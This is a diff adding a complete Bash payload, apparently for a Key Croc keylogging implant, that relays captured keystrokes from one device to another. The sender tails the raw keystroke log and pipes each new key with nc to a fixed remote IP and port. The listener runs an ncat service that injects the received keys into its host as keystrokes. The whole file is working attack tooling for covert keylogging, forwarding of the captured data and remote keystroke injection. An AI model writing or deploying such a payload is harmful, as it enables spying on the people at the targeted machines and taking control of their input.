@@ -1,0 +1,62 @@
+#!/bin/bash
+trap "kill 0" EXIT
+###########################################
+# Title: Simplex
+# Author: Cribbit
+# Description: Send key from one croc to another
+# Target: Multi
+###########################################
+
+MATCH croc_send
+MATCH croc_listen
+
+LED SETUP
+QUACK DELAY 200
+# variables
+croc2=192.168.1.100
+port=8080
+# fixed variables
+charlog=/root/loot/croc_char.log
+rawlog=/root/loot/croc_raw.log
+LED SPECIAL
+# if listener set up netcat
+if [[ "$LOOT" == "croc_listen" ]]; then
+	# Set up a command for nc to send to QUACK.
+	CMD="while true; do read i && QUACK KEYCODE \$i ; done"
+	# set nc to run in its own process
+	ncat -lvnk -p $port -c "$CMD" &
+	# give nc time to start
+	sleep 1
+fi
+
+LED ATTACK
+# get the current line count
+point=$(wc -l "$rawlog" | awk {'print $1'})
+# forever loop
+while :
+do
+	# if sender
+	if [[ "$LOOT" == "croc_send" ]]; then
+		# get the current line count
+		cnt=$(wc -l "$rawlog" | awk {'print $1'})
+		# compaire the first with the secound
+		if [ "$cnt" -ne "$point" ]; then
+			# get the differnce
+			dif=$((cnt-point))
+			while read -r line; do
+				key=${line:0:8}
+				echo $key -n | nc -w 2 $croc2 $port
+			done <<< "$(tail --lines $dif $rawlog)"
+			# reset count
+			point=$cnt
+		fi
+	fi
+	# should we exit
+	if tail -c 6 "$charlog" | grep -q 'exit'; then
+		sleep 1
+		break;
+	fi
+done
+
+LED FINISH
+sleep 1
